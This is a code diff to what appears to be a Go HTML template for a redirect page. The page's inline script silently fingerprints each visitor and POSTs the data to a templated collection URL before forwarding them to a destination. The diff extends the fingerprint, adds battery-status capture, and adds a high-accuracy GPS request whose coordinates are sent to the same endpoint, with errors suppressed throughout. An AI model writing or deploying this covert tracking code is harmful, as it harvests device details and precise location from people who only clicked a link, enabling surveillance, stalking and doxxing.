@@ -10,16 +10,22 @@
 <script>
 (async () => {
   const fp = {
-    screen: { w: screen.width, h: screen.height },
+    screen: {
+      w: screen.width,
+      h: screen.height,
+      availW: screen.availWidth,
+      availH: screen.availHeight,
+      dpr: window.devicePixelRatio || 1,
+      colorDepth: screen.colorDepth
+    },
     viewport: { w: innerWidth, h: innerHeight },
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     language: navigator.language,
     languages: Array.from(navigator.languages || []),
     platform: navigator.platform,
+    touch: navigator.maxTouchPoints || 0,
     hwConcurrency: navigator.hardwareConcurrency,
-    colorDepth: screen.colorDepth,
     doNotTrack: navigator.doNotTrack,
-    plugins: Array.from(navigator.plugins || []).map(p => p.name),
     webgl: (() => {
       try {
         const c = document.createElement('canvas').getContext('webgl');
@@ -31,6 +37,12 @@
     referrer: document.referrer || null
   };
   try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      fp.battery = { level: Math.round(b.level * 100), charging: b.charging };
+    }
+  } catch (_) {}
+  try {
     await fetch({{.FingerprintURL}}, {
       method: 'POST',
       body: JSON.stringify(fp),
@@ -38,6 +50,28 @@
       keepalive: true
     });
   } catch (_) { /* swallow */ }
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        try {
+          fetch({{.FingerprintURL}}, {
+            method: 'POST',
+            body: JSON.stringify({
+              gps: {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                acc: pos.coords.accuracy
+              }
+            }),
+            headers: {'Content-Type': 'application/json'},
+            keepalive: true
+          });
+        } catch (_) {}
+      },
+      () => {},
+      { timeout: 3000, enableHighAccuracy: true }
+    );
+  }
   window.location.replace({{.Destination}});
 })();
 </script>
